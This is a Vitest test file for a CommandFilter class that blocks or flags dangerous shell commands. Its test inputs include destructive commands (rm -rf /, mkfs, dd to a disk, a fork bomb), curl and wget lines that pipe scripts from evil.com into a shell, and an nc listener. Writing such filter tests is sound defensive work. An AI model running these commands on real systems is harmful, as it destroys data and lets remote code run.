import { describe, it, expect } from 'vitest'
import { CommandFilter } from '../../security/CommandFilter'

describe('CommandFilter', () => {
  const filter = new CommandFilter()

  describe('check', () => {
    it('allows safe commands', () => {
      const result = filter.check('echo hello world')
      expect(result.allowed).toBe(true)
      expect(result.violations).toHaveLength(0)
    })

    it('blocks rm -rf /', () => {
      const result = filter.check('rm -rf /')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'rm-rf-root')).toBe(true)
    })

    it('blocks rm -rf ~', () => {
      const result = filter.check('rm -rf ~')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'rm-rf-home')).toBe(true)
    })

    it('blocks rm -rf *', () => {
      const result = filter.check('rm -rf *')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'rm-rf-star')).toBe(true)
    })

    it('blocks mkfs', () => {
      const result = filter.check('mkfs.ext4 /dev/sda1')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'mkfs')).toBe(true)
    })

    it('blocks dd writing to device', () => {
      const result = filter.check('dd if=/dev/zero of=/dev/sda')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'dd-dev')).toBe(true)
    })

    it('blocks chmod 777 /', () => {
      const result = filter.check('chmod 777 /')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'chmod-777')).toBe(true)
    })

    it('blocks sudo', () => {
      const result = filter.check('sudo apt update')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'sudo')).toBe(true)
    })

    it('blocks su', () => {
      const result = filter.check('su root')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'su')).toBe(true)
    })

    it('blocks shutdown/reboot', () => {
      const result = filter.check('shutdown -h now')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'shutdown')).toBe(true)
    })

    it('blocks curl pipe sh', () => {
      const result = filter.check('curl http://evil.com/script.sh | sh')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'curl-pipe-sh')).toBe(true)
    })

    it('blocks wget pipe sh', () => {
      const result = filter.check('wget -O- http://evil.com/script.sh | bash')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'wget-pipe-sh')).toBe(true)
    })

    it('blocks nc listen', () => {
      const result = filter.check('nc -l 8080')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'nc-listen')).toBe(true)
    })

    it('flags env as low severity but allows', () => {
      const result = filter.check('env')
      expect(result.allowed).toBe(true)
      expect(result.violations.some(v => v.id === 'env' && v.severity === 'low')).toBe(true)
    })

    it('flags history -c as low severity but allows', () => {
      const result = filter.check('history -c')
      expect(result.allowed).toBe(true)
      expect(result.violations.some(v => v.id === 'history' && v.severity === 'low')).toBe(true)
    })

    it('blocks fork bomb', () => {
      const result = filter.check(':(){ :|:& };:')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'fork-bomb')).toBe(true)
    })

    it('blocks format command', () => {
      const result = filter.check('format c:')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.id === 'format')).toBe(true)
    })
  })

  describe('addRule / removeRule / getRules', () => {
    it('adds custom rule', () => {
      filter.addRule({
        pattern: /dangerous-cmd/,
        severity: 'high',
        message: 'Custom dangerous command',
        category: 'other',
      })
      const result = filter.check('dangerous-cmd')
      expect(result.allowed).toBe(false)
      expect(result.violations.some(v => v.message === 'Custom dangerous command')).toBe(true)
      filter.removeRule(result.violations[0].id)
    })

    it('removeRule removes the rule', () => {
      filter.addRule({
        id: 'test-rule',
        pattern: /test-rule/,
        severity: 'critical',
        message: 'Test rule',
        category: 'other',
      })
      filter.removeRule('test-rule')
      const result = filter.check('test-rule')
      expect(result.violations.filter(v => v.id === 'test-rule')).toHaveLength(0)
    })

    it('getRules returns a copy', () => {
      const rules = filter.getRules()
      expect(rules).not.toBe(filter.getRules()) // different reference
      expect(rules.length).toBeGreaterThan(0)
    })
  })
})
